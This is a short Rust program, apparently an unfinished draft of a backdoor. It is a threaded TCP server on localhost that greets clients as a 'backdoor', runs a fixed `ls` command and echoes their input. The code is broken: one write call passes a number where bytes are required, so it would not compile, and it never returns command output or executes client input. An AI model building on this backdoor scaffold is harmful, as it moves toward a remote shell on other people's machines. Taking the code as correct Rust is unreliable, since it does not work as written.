use std::io::{Write, Read};
use std::net::{TcpListener, TcpStream};
use std::thread;
use std::process::Command;
use std::env;
use std::time::Duration;
use std::option::Option;


fn handle_client(mut stream: TcpStream) {
    println!("New connection: {}", stream.peer_addr().unwrap());
    stream.write(b"Welcome to my wonderful backdoor:\r\n");

    loop {
        let mut buf = [0; 1028];
        match stream.read(&mut buf) {
            Ok(n) => {
               if n == 0 {
                   break;
               }
               let output = Command::new("ls")
                       .output()
                       .expect("failed to execute");
               stream.write(output.stdout.len()).unwrap();
               stream.write(&buf[0..n]).unwrap();
               let s = String::from_utf8(buf.to_owned()).expect("Error while parsing this shit");
            }
            Err(err) => {
                panic!(err);
            }
        }
    }
}

    

fn main() {
    let args: Vec<_> = env::args().collect();
    if args.len() != 2 { panic!("Usage:\n<appname> port") }

    let mut address: String = "127.0.0.1:".to_owned();
    address.push_str(args[1].as_str());

    let listener = TcpListener::bind(address).unwrap();
    println!("listening started on 127.0.0.1:{}, ready to accept", args[1]);

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                thread::spawn(move || {
                    handle_client(stream);
            });
            }
            Err(_) => {
                println!("Error");
            }
        };
    }
}
